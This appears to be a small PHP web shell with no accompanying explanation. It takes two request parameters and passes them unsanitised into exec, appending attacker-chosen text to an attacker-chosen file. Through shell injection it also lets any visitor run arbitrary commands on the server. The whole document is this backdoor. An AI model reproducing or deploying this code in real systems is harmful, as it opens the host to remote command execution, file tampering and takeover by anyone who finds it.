<?php
echo "start";
if(function_exists('exec'))
	exec('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
?>